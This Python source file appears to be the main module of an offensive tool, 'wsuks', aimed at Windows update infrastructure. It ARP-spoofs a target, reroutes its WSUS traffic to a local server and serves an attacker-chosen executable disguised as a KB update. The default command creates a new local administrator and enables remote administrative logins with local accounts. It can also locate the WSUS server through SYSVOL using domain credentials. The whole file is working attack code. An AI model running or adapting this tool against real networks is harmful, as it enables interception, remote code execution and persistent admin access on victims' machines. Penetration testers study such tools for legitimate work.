from functools import partial
from http.server import HTTPServer
import logging
import os
from pprint import pformat
import random
from string import digits, ascii_letters
import sys
from scapy.all import get_if_addr
import wsuks
from wsuks.lib.arpspoofer import ArpSpoofer
from wsuks.lib.logger import initLogger
from wsuks.lib.argparser import initParser, printBanner
from wsuks.lib.sysvolparser import SysvolParser
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer
from wsuks.lib.router import Router
from termcolor import colored
import ssl
from ipaddress import ip_address
import socket


class Wsuks:
    def __init__(self, args):
        self.args = args
        self.logger = logging.getLogger("wsuks")

        self.interface = args.interface
        try:
            self.hostIp = get_if_addr(self.interface)
        except ValueError:
            self.logger.error(f"Interface '{args.interface}' not found! Exiting...")
            exit(1)
        self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
        self.local_password = "".join(random.sample(ascii_letters + digits, 12)) + "1!"

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.executable_file = args.executable.read()
        self.executable_name = os.path.basename(args.executable.name)
        args.executable.close()

        # Check if supplied WSUS Server is an IP or DNS name and resolve it
        self.wsusHost = args.wsusHost
        if self.wsusHost:
            try:
                self.wsusIp = str(ip_address(self.wsusHost))
            except ValueError:
                self.logger.debug(f"Host '{self.wsusHost}' is not an IP Address, trying to resolve host.")
                try:
                    self.wsusIp = socket.gethostbyname(self.wsusHost)
                except socket.gaierror:
                    self.logger.error(f"Error: Could not resolve host '{self.wsusHost}'. Exiting...")
                    exit(1)
        else:
            self.wsusIp = None
        if args.wsusPort:
            self.wsusPort = args.wsusPort
        elif args.tlsCert:
            self.wsusPort = 8531  # Default port for HTTPS WSUS Server
        else:
            self.wsusPort = 8530  # Default port for HTTP WSUS Server

        # Automatic mode variables
        self.domain_username = args.username
        self.domain_password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp
        self.kerberos = args.kerberos
        self.dcName = args.dcName

        # Set Command
        if "CREATE_USER_COMMAND" not in args.command:
            self.command = args.command
        else:
            # Case we add the domain user to the local admin group
            if args.username and args.domain:
                self.logger.success(f"Using domain user for the WSUS attack: User={highlight(args.username, 'green')} Password={highlight(args.password, 'green')} Domain={highlight(args.domain, 'green')}")
                self.command = str(args.command).format(CREATE_USER_COMMAND="", WSUKS_USER=args.domain + "\\" + args.username)
            # Case we generate a local user, add him to the local admin group and make sure LocalAccountTokenFilterPolicy is set to 1
            else:
                with open(os.path.join(os.path.dirname(wsuks.__file__), "executables/Enable-LocalAccountTokenFilterPolicy.ps1")) as file:
                    ps_script = ""
                    for line in file:
                        if line.startswith("#"):
                            continue
                        else:
                            ps_script += line
                self.logger.success(f"Generated local user for the WSUS attack: Username={highlight(self.local_username, 'green')} Password={highlight(self.local_password, 'green')}")
                create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description $(\n{ps_script});\n"
                self.command = str(args.command).format(CREATE_USER_COMMAND=create_user, WSUKS_USER=self.local_username)
                self.logger.warning("WARNING: LocalAccountTokenFilterPolicy will be to 1 to allow remote administrative connections with local accounts. See README for details.")
        self.logger.success(f"Command to execute: \n{highlight(self.executable_name, 'yellow')} {highlight(self.command, 'yellow')}")

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp, self.kerberos, self.dcName)
        else:
            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")

        if self.args.only_discover:
            self.logger.info("Discovered WSUS Server, Exiting...")
            return

        # Should only happen when crawling SYSVOL share
        if not self.wsusIp or not self.wsusPort:
            self.logger.error("Error: WSUS-Server-IP not set. Try to specify the WSUS Server manually with --WSUS-Server and --WSUS-Port. Exiting...")
            sys.exit(1)
        else:
            self.wsusPort = int(self.wsusPort)

        self.logger.info("===== Setup done, starting services =====")
        # Start Arp Spoofing
        arpspoofer = ArpSpoofer(self.interface)
        arpspoofer.start(self.targetIp, self.wsusIp)

        # Set up routing to route spoofed packages to the local HTTP server
        router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
        router.start()

        # Prepare WSUS HTTP Server
        # If we have a TLS cert we have to switch to HTTPS and supply the DNS name
        if self.args.tlsCert:  # noqa: SIM108
            update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f"https://{self.wsusHost}:{self.wsusPort}")
        else:
            update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f"http://{self.hostIp}:{self.wsusPort}")
        update_handler.set_resources_xml(self.command)
        self.logger.debug(update_handler)

        http_handler = partial(WSUSBaseServer, update_handler)
        http_server = HTTPServer((self.hostIp, self.wsusPort), http_handler)

        # Add certificates for HTTPS
        if self.args.tlsCert:
            if not os.path.isfile(self.args.tlsCert):
                self.logger.error(f"TLS certificate file '{self.args.tlsCert}' not found! Exiting...")
                exit(1)
            self.logger.info(f"Using TLS certificate '{self.args.tlsCert}' for HTTPS WSUS Server")
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.args.tlsCert)
            context.check_hostname = False
            http_server.socket = context.wrap_socket(http_server.socket, server_side=True)

        try:
            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
            self.logger.info(f"Serving executable as KB: {update_handler.kb_number}")
            http_server.serve_forever()
        except KeyboardInterrupt:
            print()
            self.logger.info("===== Stopping Services =====")
            self.logger.info("Stopping WSUS Server...")
        finally:
            arpspoofer.stop()
            router.stop()


def highlight(text, color):
    return colored(text, color, attrs=["bold"])


def main():
    # Setup
    printBanner()
    args = initParser()

    logger = initLogger(ts=args.timestamp, debug=args.debug)
    logger.debug("Passed args:\n" + pformat(vars(args)))

    # Prevent scapy from logging to console
    logging.getLogger("scapy").disabled = True
    logging.getLogger("scapy.runtime").disabled = True

    if os.geteuid() != 0:
        logger.error("This script must be run as root!")
        exit(1)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == "__main__":
    main()
